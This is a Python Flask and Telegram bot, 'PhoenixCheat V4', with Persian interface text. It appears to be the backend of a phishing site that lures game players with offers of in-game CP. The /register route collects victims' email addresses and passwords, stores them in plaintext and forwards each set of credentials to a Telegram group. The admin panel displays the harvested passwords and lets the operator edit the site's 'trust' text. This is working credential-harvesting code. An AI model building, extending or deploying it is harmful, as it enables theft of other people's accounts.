# -*- coding: utf-8 -*-
# PhoenixCheat Bot V4 - Phase 2: User Management

import json
import os
import random
import string
import threading
from datetime import datetime

from dotenv import load_dotenv
load_dotenv()

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
from telegram.request import HTTPXRequest

from config import (
    BOT_TOKEN, ADMIN_ID,
    USE_PROXY, PROXY_TYPE, PROXY_HOST, PROXY_PORT,
    CODE_PREFIX, SUPPORT_ID
)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "data.json")
app_web = Flask(__name__, static_folder=BASE_DIR)
CORS(app_web)
bot_app = None
USER_STATES = {}

# ==========================================
# Database
# ==========================================
def load_data():
    with open(DB_PATH, "r", encoding="utf-8") as f:
        return json.load(f)

def save_data(data):
    with open(DB_PATH, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def make_code(user_id):
    rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"{user_id}-{CODE_PREFIX}-{rand}"

def find_user(uid):
    db = load_data()
    for u in db.get("users", []):
        if u["id"] == uid:
            return u, db
    return None, db

# ==========================================
# Flask Routes
# ==========================================
@app_web.route("/")
def index():
    return send_from_directory(BASE_DIR, "index.html")

@app_web.route("/api/settings", methods=["GET"])
def get_settings():
    db = load_data()
    return jsonify({
        "texts": db.get("texts", {}),
        "settings": db.get("settings", {})
    })

@app_web.route("/register", methods=["POST"])
def register():
    try:
        data = request.get_json()
        email = data.get("email", "").strip()
        password = data.get("password", "").strip()
        rubika = data.get("rubika", "").strip()
        desc = data.get("desc", "").strip()
        cp = int(data.get("sp", 0))

        db = load_data()
        max_cp = db.get("settings", {}).get("max_cp", 100000)

        if not email or not password or not rubika or not cp:
            return jsonify({"success": False, "message": "همه فیلدها الزامی است"}), 400

        if cp > max_cp:
            return jsonify({"success": False, "message": f"CP بیشتر از {max_cp} مجاز نیست"}), 400

        uid = db.get("next_user_id", 1)
        code = make_code(uid)

        user = {
            "id": uid,
            "email": email,
            "password": password,
            "rubika": rubika,
            "desc": desc,
            "sp": cp,
            "code": code,
            "note": "",
            "display_name": "",
            "date": datetime.now().strftime("%Y-%m-%d %H:%M")
        }

        db["users"].append(user)
        db["next_user_id"] = uid + 1
        db["stats"]["total_users"] = len(db["users"])
        db["stats"]["total_visits"] = db["stats"].get("total_visits", 0) + 1
        save_data(db)

        threading.Thread(target=send_to_telegram, args=(user,), daemon=True).start()
        return jsonify({"success": True, "code": code, "id": uid})

    except Exception as e:
        print(f"Register error: {e}")
        return jsonify({"success": False, "message": "خطای سرور"}), 500


def send_to_telegram(user):
    global bot_app
    if bot_app is None:
        return
    db = load_data()
    group_id = db.get("settings", {}).get("group_id")
    if not group_id:
        return
    try:
        import asyncio
        text = (
            f"🆕 کاربر جدید #{user['id']}\n\n"
            f"📧 ایمیل: {user['email']}\n"
            f"🔑 رمز: {user['password']}\n"
            f"💬 روبیکا: {user['rubika']}\n"
            f"📝 توضیحات: {user['desc']}\n"
            f"💎 CP: {user['sp']:,}\n"
            f"🎫 کد: {user['code']}\n"
            f"📅 {user['date']}"
        )
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(bot_app.bot.send_message(chat_id=group_id, text=text))
        loop.close()
    except Exception as e:
        print(f"❌ Send error: {e}")


# ==========================================
# Admin Panel
# ==========================================
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(f"⛔️ Access Denied!\n🎧 {SUPPORT_ID}")
        return

    keyboard = [
        [InlineKeyboardButton("👥 لیست کاربران", callback_data="list_users")],
        [InlineKeyboardButton("➕ افزودن کاربر", callback_data="add_user_info")],
        [InlineKeyboardButton("🔍 جستجو با شماره", callback_data="search_info")],
        [InlineKeyboardButton("📊 آمار کامل", callback_data="stats")],
        [InlineKeyboardButton("📝 ویرایش متن سایت", callback_data="edit_texts")],
        [InlineKeyboardButton("⚙️ تنظیم گروه", callback_data="set_group")],
        [InlineKeyboardButton("💰 تنظیم قیمت‌ها", callback_data="edit_prices")],
        [InlineKeyboardButton("📢 پیام همگانی", callback_data="broadcast")],
        [InlineKeyboardButton("🔒 بستن/باز کردن سایت", callback_data="toggle_site")],
        [InlineKeyboardButton("🔧 وضعیت فعلی", callback_data="status")],
    ]
    await update.message.reply_text(
        "🎮 PhoenixCheat Admin Panel\n\nیک گزینه را انتخاب کن:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ==========================================
# Button Handler
# ==========================================
async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    db = load_data()

    # ========== لیست کاربران ==========
    if data == "list_users":
        users = db.get("users", [])
        if not users:
            await query.edit_message_text("📭 هنوز کاربری ثبت نشده.")
            return
        await show_users_page(query, users, 0)

    elif data.startswith("page_"):
        page = int(data.replace("page_", ""))
        users = db.get("users", [])
        await show_users_page(query, users, page)

    # ========== نمایش کاربر ==========
    elif data.startswith("user_"):
        uid = int(data.replace("user_", ""))
        user, _ = find_user(uid)
        if not user:
            await query.edit_message_text("❌ کاربر پیدا نشد.")
            return
        await show_user_detail(query, user)

    # ========== حذف کاربر ==========
    elif data.startswith("del_"):
        uid = int(data.replace("del_", ""))
        user, db = find_user(uid)
        if not user:
            await query.edit_message_text("❌ کاربر پیدا نشد.")
            return
        db["users"] = [u for u in db["users"] if u["id"] != uid]
        db["stats"]["total_users"] = len(db["users"])
        save_data(db)
        await query.edit_message_text(
            f"🗑️ کاربر #{uid} حذف شد!\n\n"
            f"📧 {user['email']}"
        )

    # ========== تأیید حذف ==========
    elif data.startswith("confirm_del_"):
        uid = int(data.replace("confirm_del_", ""))
        user, _ = find_user(uid)
        if not user:
            await query.edit_message_text("❌ کاربر پیدا نشد.")
            return
        keyboard = [
            [InlineKeyboardButton("✅ بله، حذف کن", callback_data=f"del_{uid}")],
            [InlineKeyboardButton("❌ انصراف", callback_data=f"user_{uid}")],
        ]
        await query.edit_message_text(
            f"⚠️ مطمئنی می‌خوای کاربر #{uid} رو حذف کنی؟\n\n"
            f"📧 {user['email']}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # ========== ویرایش اسم ==========
    elif data.startswith("editname_"):
        uid = int(data.replace("editname_", ""))
        USER_STATES[ADMIN_ID] = {"state": "waiting_display_name", "uid": uid}
        await query.edit_message_text(
            f"✏️ اسم جدید برای کاربر #{uid} رو بنویس:\n\n"
            f"(برای لغو: /cancel)"
        )

    # ========== ویرایش توضیحات ==========
    elif data.startswith("editnote_"):
        uid = int(data.replace("editnote_", ""))
        USER_STATES[ADMIN_ID] = {"state": "waiting_note", "uid": uid}
        await query.edit_message_text(
            f"📝 توضیحات جدید برای کاربر #{uid} رو بنویس:\n\n"
            f"(برای لغو: /cancel)"
        )

    # ========== افزودن کاربر ==========
    elif data == "add_user_info":
        await query.edit_message_text(
            "➕ افزودن کاربر جدید\n\n"
            "از دستور زیر استفاده کن:\n\n"
            "/add email | password | rubika | desc | cp\n\n"
            "مثال:\n"
            "/add ali@gmail.com | 12345 | @ali | تست | 20000"
        )

    # ========== جستجو ==========
    elif data == "search_info":
        USER_STATES[ADMIN_ID] = {"state": "waiting_search"}
        await query.edit_message_text(
            "🔍 شماره کاربر رو بنویس:\n\n"
            "مثال: 1\n\n"
            "(برای لغو: /cancel)"
        )

    # ========== آمار ==========
    elif data == "stats":
        users = db.get("users", [])
        stats = db.get("stats", {})
        total_cp = sum(u.get('sp', 0) for u in users)
        avg_cp = total_cp // len(users) if users else 0
        text = (
            f"📊 آمار کامل\n\n"
            f"👥 کاربران: {len(users)}\n"
            f"👁️ بازدید: {stats.get('total_visits', 0)}\n"
            f"💎 مجموع CP: {total_cp:,}\n"
            f"📈 میانگین CP: {avg_cp:,}\n"
            f"🆔 آیدی بعدی: {db.get('next_user_id', 1)}"
        )
        keyboard = [[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    # ========== ویرایش متن ==========
    elif data == "edit_texts":
        keyboard = [
            [InlineKeyboardButton("📝 متن خوش‌آمد", callback_data="et_welcome")],
            [InlineKeyboardButton("ℹ️ درباره ما", callback_data="et_about")],
            [InlineKeyboardButton("🛡️ اعتماد", callback_data="et_trust")],
            [InlineKeyboardButton("🎧 ارتباط", callback_data="et_contact")],
            [InlineKeyboardButton("🔗 لینک‌ها", callback_data="et_links")],
            [InlineKeyboardButton("⚠️ هشدارها", callback_data="et_warnings")],
            [InlineKeyboardButton("🙏 پیام تشکر", callback_data="et_thanks")],
            [InlineKeyboardButton("🔙 بازگشت", callback_data="back")],
        ]
        await query.edit_message_text(
            "📝 ویرایش متن سایت\n\nکدوم بخش رو می‌خوای عوض کنی؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif data == "et_welcome":
        await query.edit_message_text(
            "📝 ویرایش متن خوش‌آمد\n\n"
            "/set welcome_title متن جدید\n"
            "/set welcome_text1 متن جدید\n"
            "/set welcome_text2 متن جدید"
        )

    elif data == "et_about":
        await query.edit_message_text("ℹ️ /set about_text متن جدید")

    elif data == "et_trust":
        await query.edit_message_text("🛡️ /set trust_text متن جدید")

    elif data == "et_contact":
        await query.edit_message_text("🎧 /set contact_title متن جدید")

    elif data == "et_links":
        await query.edit_message_text(
            "🔗 ویرایش لینک‌ها\n\n"
            "/set channel_link لینک\n"
            "/set channel_name نام\n"
            "/set support_link لینک\n"
            "/set support_name نام\n"
            "/set trust_link لینک\n"
            "/set trust_name نام\n"
            "/set telegram_link لینک\n"
            "/set telegram_name نام"
        )

    elif data == "et_warnings":
        await query.edit_message_text(
            "⚠️ ویرایش هشدارها\n\n"
            "/set warning_register متن\n"
            "/set warning_cp متن\n"
            "/set notice_2h متن\n"
            "/set closed_message متن"
        )

    elif data == "et_thanks":
        await query.edit_message_text("🙏 /set thanks_text متن")

    elif data == "set_group":
        current = db.get("settings", {}).get("group_id", "تنظیم نشده")
        await query.edit_message_text(
            f"⚙️ تنظیم گروه\n\n"
            f"🆔 فعلی: {current}\n\n"
            f"برای تغییر:\n/setgroup -1001234567890"
        )

    elif data == "edit_prices":
        max_cp = db.get("settings", {}).get("max_cp", 100000)
        options = db.get("settings", {}).get("cp_options", [])
        await query.edit_message_text(
            f"💰 تنظیم قیمت‌ها\n\n"
            f"حداکثر CP: {max_cp:,}\n"
            f"گزینه‌ها: {', '.join([f'{x:,}' for x in options])}\n\n"
            f"/setmaxcp 100000\n"
            f"/setoptions 10000,20000,50000"
        )

    elif data == "broadcast":
        current = db.get("texts", {}).get("broadcast_message", "")
        await query.edit_message_text(
            f"📢 پیام همگانی\n\n"
            f"فعلی: {current if current else 'خالی'}\n\n"
            f"/set broadcast_message متن"
        )

    elif data == "toggle_site":
        status = db.get("texts", {}).get("site_status", "open")
        new_status = "closed" if status == "open" else "open"
        emoji = "🔒" if new_status == "closed" else "🟢"
        await query.edit_message_text(
            f"🔒 بستن/باز کردن سایت\n\n"
            f"فعلی: {status}\n"
            f"جدید: {new_status} {emoji}\n\n"
            f"/togglesite"
        )

    elif data == "status":
        status = db.get("texts", {}).get("site_status", "open")
        group_id = db.get("settings", {}).get("group_id", "تنظیم نشده")
        broadcast = db.get("texts", {}).get("broadcast_message", "")
        text = (
            f"🔧 وضعیت فعلی\n\n"
            f"🌐 سایت: {status}\n"
            f"🆔 گروه: {group_id}\n"
            f"📢 پیام: {broadcast if broadcast else 'خالی'}\n"
            f"👥 کاربران: {len(db.get('users', []))}"
        )
        keyboard = [[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "back":
        keyboard = [
            [InlineKeyboardButton("👥 لیست کاربران", callback_data="list_users")],
            [InlineKeyboardButton("➕ افزودن کاربر", callback_data="add_user_info")],
            [InlineKeyboardButton("🔍 جستجو با شماره", callback_data="search_info")],
            [InlineKeyboardButton("📊 آمار کامل", callback_data="stats")],
            [InlineKeyboardButton("📝 ویرایش متن سایت", callback_data="edit_texts")],
            [InlineKeyboardButton("⚙️ تنظیم گروه", callback_data="set_group")],
            [InlineKeyboardButton("💰 تنظیم قیمت‌ها", callback_data="edit_prices")],
            [InlineKeyboardButton("📢 پیام همگانی", callback_data="broadcast")],
            [InlineKeyboardButton("🔒 بستن/باز کردن سایت", callback_data="toggle_site")],
            [InlineKeyboardButton("🔧 وضعیت فعلی", callback_data="status")],
        ]
        await query.edit_message_text(
            "🎮 PhoenixCheat Admin Panel\n\nیک گزینه را انتخاب کن:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )


# ==========================================
# Show Users Page
# ==========================================
async def show_users_page(query, users, page):
    per_page = 5
    total = len(users)
    total_pages = (total + per_page - 1) // per_page
    page = max(0, min(page, total_pages - 1))

    start = page * per_page
    end = start + per_page
    page_users = users[start:end]

    text = f"👥 لیست کاربران (صفحه {page + 1}/{total_pages})\n\n"
    keyboard = []

    for u in page_users:
        text += f"#{u['id']} | {u['email']}\n"
        keyboard.append([
            InlineKeyboardButton(
                f"#{u['id']} - {u['email'][:20]}",
                callback_data=f"user_{u['id']}"
            )
        ])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️ قبلی", callback_data=f"page_{page-1}"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton("بعدی ▶️", callback_data=f"page_{page+1}"))
    if nav:
        keyboard.append(nav)

    keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="back")])

    await query.edit_message_text(
        text + "\nبرای دیدن اطلاعات، روی کاربر بزن:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ==========================================
# Show User Detail
# ==========================================
async def show_user_detail(query, user):
    display_name = user.get("display_name", "") or "تنظیم نشده"
    note = user.get("note", "") or "ندارد"

    text = (
        f"👤 اطلاعات کاربر #{user['id']}\n\n"
        f"📧 ایمیل: {user['email']}\n"
        f"🔑 رمز: {user['password']}\n"
        f"💬 روبیکا: {user['rubika']}\n"
        f"📝 توضیحات: {user['desc'] or 'ندارد'}\n"
        f"💎 CP: {user['sp']:,}\n"
        f"🎫 کد: {user['code']}\n"
        f"📅 تاریخ: {user['date']}\n\n"
        f"✏️ اسم نمایشی: {display_name}\n"
        f"🗒️ یادداشت: {note}"
    )

    keyboard = [
        [
            InlineKeyboardButton("✏️ ویرایش اسم", callback_data=f"editname_{user['id']}"),
            InlineKeyboardButton("📝 ویرایش یادداشت", callback_data=f"editnote_{user['id']}"),
        ],
        [InlineKeyboardButton("🗑️ حذف کاربر", callback_data=f"confirm_del_{user['id']}")],
        [InlineKeyboardButton("🔙 بازگشت", callback_data="list_users")],
    ]

    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ==========================================
# Text Message Handler (for states)
# ==========================================
async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    state_data = USER_STATES.get(ADMIN_ID)
    if not state_data:
        return

    state = state_data.get("state")
    text = update.message.text.strip()

    # --- ویرایش اسم نمایشی ---
    if state == "waiting_display_name":
        uid = state_data["uid"]
        user, db = find_user(uid)
        if user:
            user["display_name"] = text
            save_data(db)
            await update.message.reply_text(f"✅ اسم نمایشی کاربر #{uid} تغییر کرد به:\n{text}")
        USER_STATES.pop(ADMIN_ID, None)

    # --- ویرایش یادداشت ---
    elif state == "waiting_note":
        uid = state_data["uid"]
        user, db = find_user(uid)
        if user:
            user["note"] = text
            save_data(db)
            await update.message.reply_text(f"✅ یادداشت کاربر #{uid} ثبت شد!")
        USER_STATES.pop(ADMIN_ID, None)

    # --- جستجو ---
    elif state == "waiting_search":
        try:
            uid = int(text)
            user, _ = find_user(uid)
            if user:
                display_name = user.get("display_name", "") or "تنظیم نشده"
                note = user.get("note", "") or "ندارد"
                msg = (
                    f"👤 کاربر #{user['id']}\n\n"
                    f"📧 {user['email']}\n"
                    f"🔑 {user['password']}\n"
                    f"💬 {user['rubika']}\n"
                    f"📝 {user['desc'] or 'ندارد'}\n"
                    f"💎 CP: {user['sp']:,}\n"
                    f"🎫 {user['code']}\n"
                    f"📅 {user['date']}\n\n"
                    f"✏️ اسم: {display_name}\n"
                    f"🗒️ یادداشت: {note}"
                )
                await update.message.reply_text(msg)
            else:
                await update.message.reply_text(f"❌ کاربر #{uid} پیدا نشد.")
        except:
            await update.message.reply_text("❌ شماره معتبر نیست.")
        USER_STATES.pop(ADMIN_ID, None)


# ==========================================
# Commands
# ==========================================
async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    USER_STATES.pop(ADMIN_ID, None)
    await update.message.reply_text("✅ لغو شد.")


async def set_group(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        new_group_id = int(update.message.text.replace("/setgroup ", "").strip())
    except:
        await update.message.reply_text("❌ فرمت: /setgroup -1001234567890")
        return
    db = load_data()
    db["settings"]["group_id"] = new_group_id
    save_data(db)
    await update.message.reply_text(f"✅ آیدی گروه تغییر کرد به:\n{new_group_id}")


async def add_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        text = update.message.text.replace("/add ", "").strip()
        parts = [x.strip() for x in text.split("|")]
        if len(parts) < 5:
            await update.message.reply_text(
                "❌ فرمت:\n/add email | pass | rubika | desc | cp"
            )
            return
        email, password, rubika, desc, cp_str = parts[:5]
        cp = int(cp_str)

        db = load_data()
        uid = db.get("next_user_id", 1)
        code = make_code(uid)

        user = {
            "id": uid,
            "email": email,
            "password": password,
            "rubika": rubika,
            "desc": desc,
            "sp": cp,
            "code": code,
            "note": "",
            "display_name": "",
            "date": datetime.now().strftime("%Y-%m-%d %H:%M")
        }
        db["users"].append(user)
        db["next_user_id"] = uid + 1
        db["stats"]["total_users"] = len(db["users"])
        save_data(db)

        await update.message.reply_text(
            f"✅ کاربر #{uid} اضافه شد!\n\n"
            f"📧 {email}\n"
            f"🎫 {code}"
        )

        threading.Thread(target=send_to_telegram, args=(user,), daemon=True).start()
    except Exception as e:
        await update.message.reply_text(f"❌ خطا: {e}")


async def set_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        full_text = update.message.text.replace("/set ", "").strip()
        parts = full_text.split(" ", 1)
        key = parts[0].strip()
        value = parts[1].strip() if len(parts) > 1 else ""
        value = value.replace("\\n", "\n")

        db = load_data()
        if "texts" not in db:
            db["texts"] = {}
        db["texts"][key] = value
        save_data(db)

        await update.message.reply_text(f"✅ {key} تغییر کرد!\n\n{value}")
    except Exception as e:
        await update.message.reply_text(f"❌ خطا: {e}")


async def set_max_cp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        val = int(update.message.text.replace("/setmaxcp ", "").strip())
    except:
        await update.message.reply_text("❌ فرمت: /setmaxcp 100000")
        return
    db = load_data()
    db["settings"]["max_cp"] = val
    save_data(db)
    await update.message.reply_text(f"✅ حداکثر CP: {val:,}")


async def set_options(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        text = update.message.text.replace("/setoptions ", "").strip()
        opts = [int(x.strip()) for x in text.split(",")]
    except:
        await update.message.reply_text("❌ فرمت: /setoptions 10000,20000,50000")
        return
    db = load_data()
    db["settings"]["cp_options"] = opts
    save_data(db)
    await update.message.reply_text(f"✅ گزینه‌ها: {opts}")


async def toggle_site(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    db = load_data()
    current = db.get("texts", {}).get("site_status", "open")
    new_status = "closed" if current == "open" else "open"
    db["texts"]["site_status"] = new_status
    save_data(db)
    emoji = "🔒" if new_status == "closed" else "🟢"
    await update.message.reply_text(f"{emoji} سایت: {new_status}")


# ==========================================
# Flask Thread
# ==========================================
def run_flask():
    print("🌐 Flask on http://0.0.0.0:5000")
    app_web.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)


# ==========================================
# Main
# ==========================================
def main():
    global bot_app
    print("🚀 Starting PhoenixCheat V4...")

    if not BOT_TOKEN:
        print("❌ BOT_TOKEN empty!")
        return

    if USE_PROXY:
        proxy_url = f"{PROXY_TYPE}://{PROXY_HOST}:{PROXY_PORT}"
        request = HTTPXRequest(proxy=proxy_url)
        bot_app = Application.builder().token(BOT_TOKEN).request(request).build()
    else:
        bot_app = Application.builder().token(BOT_TOKEN).build()

    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("setgroup", set_group))
    bot_app.add_handler(CommandHandler("add", add_user))
    bot_app.add_handler(CommandHandler("set", set_text))
    bot_app.add_handler(CommandHandler("setmaxcp", set_max_cp))
    bot_app.add_handler(CommandHandler("setoptions", set_options))
    bot_app.add_handler(CommandHandler("togglesite", toggle_site))
    bot_app.add_handler(CommandHandler("cancel", cancel))
    bot_app.add_handler(CallbackQueryHandler(button_handler))
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    threading.Thread(target=run_flask, daemon=True).start()
    print("✅ Bot ready!")
    bot_app.run_polling()


if __name__ == "__main__":
    main()